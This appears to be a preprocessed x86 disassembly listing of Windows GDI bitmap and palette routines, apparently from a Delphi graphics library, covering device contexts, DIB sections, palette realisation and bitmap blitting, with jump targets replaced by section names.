mov bl [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_41ed50
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_415b44
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41ed9b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41eda2
mov eax [ ebp - 0x4 ]
call sub_403224
retn
sub_41ee64
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_413c84
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41ef02
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ef09
mov eax [ rw-data ]
call sub_413ce8
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_41eeda
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_41eff4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_41d428
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_413918
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_41d3cc
test al al
je r-xdata
sub_41ef10
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_413c84
mov esi eax
xor ecx ecx
push ebp
push sub_41ef80
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_413ce8
retn
mov edx ebx
mov eax esi
call sub_413918
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ edx + 0x28 ]
mov edx [ edx + 0x8 ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
call sub_41eff4
sub_41ef8c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_41cde0
mov [ edi + 0x58 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403530
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_41efc8
push ebx
push esi
call sub_403598
mov ebx edx
mov esi eax
mov eax esi
call sub_41eff4
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41cea4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403580
sub_41eff4
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41d0e4
xor edx edx
push ebp
push sub_41f088
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x60 ]
test eax eax
je r-xdata
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41d5b0
push ebx
call DeleteDC
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_413c98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d428
retn
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
sub_41f094
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41d0e4
xor eax eax
push ebp
push sub_41f173
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_4203b0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x8 ]
call sub_41ef10
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_4204b0
push 0x0
call CreateCompatibleDC
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x8 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x5c ] edx
push esi
push ebx
call SelectObject
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x60 ] edx
push 0xffffffff
push esi
push ebx
call SelectPalette
mov edx [ ebp - 0x4 ]
mov [ edx + 0x60 ] eax
push ebx
call RealizePalette
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x10 ]
test esi esi
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41d5b0
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_413bfc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d428
retn
sub_41f184
push ebx
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
dec [ ebx + 0x4 ]
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax ebx
call sub_403224
sub_41f1a4
push ebx
push esi
call sub_403598
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx ]
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
call sub_41ef10
mov eax [ esi + 0x14 ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x14 ] eax
lea eax [ esi + 0x6c ]
call sub_40ccd0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403214
test bl bl
jle r-xdata
push eax
call CloseHandle
pop esi
pop ebx
retn
mov eax esi
call sub_403580
sub_41f200
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
call sub_41b6ec
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
call sub_41ef10
mov eax [ ebx + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ ebx + 0xc ] eax
call sub_41ef10
mov eax [ ebx + 0x8 ]
push eax
call DeleteObject
sub_41f24c
push ebp
mov ebp esp
add esp 0xfffffbf0
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ecx + 0x26 ] 0x8
ja r-xdata
lea edx [ ebp - 0x410 ]
mov ecx 0xff
mov eax [ ebp - 0x4 ]
call sub_41e0b0
mov ebx eax
test ebx ebx
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_41f2fb
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x410 ]
push eax
push ebx
push 0x0
mov eax [ ebp - 0xc ]
push eax
call SetDIBColorTable
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_41f308
test [ eax + 0x28 ] 0x3
je r-xdata
retn
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov dx [ eax + 0x26 ]
cmp dx 0x10
jne r-xdata
cmp dx 0x20
jne r-xdata
mov [ eax + 0x40 ] 0xf800
mov [ eax + 0x44 ] 0x7e0
mov [ eax + 0x48 ] 0x1f
jmp r-xdata
mov [ eax + 0x40 ] 0xff0000
mov [ eax + 0x44 ] 0xff00
mov [ eax + 0x48 ] 0xff
sub_41f354
push ebp
mov ebp esp
add esp 0xffffff68
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41ef10
xor eax eax
mov [ ebp - 0x70 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
push 0x0
call GetDC
call sub_41d91c
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_41d91c
mov [ ebp - 0x1c ] eax
xor edx edx
push ebp
push sub_41f9a2
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x28
jae r-xdata
lea eax [ ebp - 0x88 ]
push eax
push 0x54
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
cmp eax 0x18
jge r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax 0x42c
call sub_4026bc
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_41f6ac
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
mov [ eax + 0x18 ] 0x28
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x10 ]
mov edx [ ebp + 0xc ]
or ax [ edx + 0x12 ]
cmp ax 0x1
jne r-xdata
call sub_41d808
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x24 ]
lea esi [ eax + 0x18 ]
mov edi edx
mov ecx 0xa
[ edi ] [ esi ]
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x8 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
ja r-xdata
push 0xc
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xe
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax [ ebp + 0xc ]
mov [ eax + 0x26 ] bx
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleBitmap
call sub_41d91c
mov [ ebp - 0x10 ] eax
jmp r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
call CreateBitmap
call sub_41d91c
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x26 ]
cmp ax 0x10
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
mov eax [ ebp - 0x10 ]
call sub_41d91c
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
call sub_41d91c
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_41f953
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_41f942
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x34 ] eax
xor ebx ebx
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
test [ eax + 0x28 ] 0x3
je r-xdata
mov edx [ ebp + 0xc ]
cmp ax 0x20
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_41f920
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x1c ]
push eax
call RealizePalette
push 0x0
push 0x0
lea eax [ ebp - 0x28 ]
push eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateDIBSection
call sub_41d91c
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
call sub_41f308
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp + 0xc ]
add eax 0x40
mov ecx 0xc
call sub_4028b8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov ecx 0xff
mov eax [ ebp - 0xc ]
call sub_41e0b0
jmp r-xdata
mov eax [ ebp - 0x24 ]
xor edx edx
mov [ eax + 0x28 ] edx
mov eax [ ebp - 0x24 ]
add eax 0x28
add eax 0x4
mov [ eax ] 0xffffff
jmp r-xdata
cmp [ ebp - 0x74 ] 0x0
jne r-xdata
push 0xff0062
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call PatBlt
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_41ccc4
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x98 ]
push eax
mov ecx [ ebp + 0xc ]
mov ecx [ ecx + 0x4 ]
xor edx edx
xor eax eax
call sub_4124e4
lea eax [ ebp - 0x98 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call FillRect
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41bfbc
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_41cc88
call sub_41bfbc
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_41d874
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x70 ] 0x0
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f927
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_41d91c
mov [ ebp - 0x20 ] eax
xor eax eax
push ebp
push sub_41f8f6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_41d91c
mov esi eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x24 ]
call sub_4026dc
retn
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
cmp eax [ ebp - 0x84 ]
jne r-xdata
push 0x0
mov eax [ ebp - 0x24 ]
push eax
push 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
cmp [ ebp - 0x74 ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
mov ebx eax
mov eax [ ebp - 0x20 ]
push eax
call RealizePalette
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41bfbc
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_41cc88
call sub_41bfbc
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x30 ]
push eax
push 0x2
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call SetDIBColorTable
jmp r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cmp eax [ ebp - 0x80 ]
jne r-xdata
mov eax [ ebp - 0x24 ]
add eax 0x28
push eax
push 0x100
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call GetDIBColorTable
mov edx [ ebp + 0xc ]
mov [ edx + 0x38 ] eax
jmp r-xdata
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call BitBlt
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41bfbc
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_41cc88
call sub_41bfbc
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
jbe r-xdata
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
jmp r-xdata
push esi
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_41d91c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x20 ]
push eax
call DeleteDC
retn
push 0xffffffff
push ebx
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
call sub_403a44
call sub_403a44
jmp r-xdata
sub_41f949
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_41f958
mov eax [ ebp - 0x10 ]
push eax
call DeleteObject
call sub_4039c0
call sub_403a14
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_41f9b8
push ebx
push esi
add esp 0xfffffbf8
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
add esp 0x408
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
mov [ esp + 0x4 ] 0x300
mov ax [ esp ]
mov [ esp + 0x6 ] ax
lea eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
lea eax [ esp + 0x4 ]
push eax
call CreatePalette
mov esi eax
sub_41fa1c
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x70 ]
push eax
push 0x54
push ebx
call GetObjectA
test eax eax
je r-xdata
mov eax ebx
call sub_41ef10
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_41fc17
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call GetDC
call sub_41d91c
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_41d91c
mov [ ebp - 0x10 ] eax
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
call CreateBitmap
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
cmp edi 0x1fffffff
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_41d91c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41fbcf
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x5c ] 0x0
je r-xdata
push 0x42
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call PatBlt
jmp r-xdata
retn
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
mov [ ebp - 0x11 ] 0x0
mov [ ebp - 0x11 ] 0x1
xor eax eax
mov [ ebp - 0x58 ] eax
lea eax [ ebp - 0x70 ]
push eax
push 0x0
mov ecx esi
mov edx esi
mov eax ebx
call sub_41f354
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push edi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
mov esi eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call BitBlt
push esi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
push 0x0
push esi
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push ebx
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
test esi esi
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push ebx
call DeleteObject
sub_41fc28
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_41ea84
mov [ edi + 0x34 ] 0x20000000
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_41f180
cmp [ rw-data ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403530
mov eax edi
test bl bl
je r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_41fc90
push ebx
push esi
call sub_403598
mov ebx edx
mov esi eax
mov eax esi
call sub_4203a0
mov eax [ esi + 0x28 ]
call sub_41f184
mov eax [ esi + 0x2c ]
call sub_403224
mov edx ebx
and dl 0xfc
mov eax esi
call sub_413e90
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403580
sub_41fccc
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_41fd84
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402c40
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_420610
mov esi ebx
mov eax [ esi + 0x28 ]
call sub_41f180
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_41f184
mov eax [ esi + 0x28 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov al [ esi + 0x21 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x21 ] al
mov eax [ esi + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov al [ esi + 0x38 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] al
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_413ebc
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
sub_41fdbc
push ebp
mov ebp esp
add esp 0xffffffa4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x5c ]
push ecx
mov ecx 0x15
[ edi ] [ esi ]
pop ecx
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_4203a0
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41fe4b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ rw-data ]
jne r-xdata
mov eax esi
call sub_41f9b8
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x8 ] esi
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax edi
call sub_41f354
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
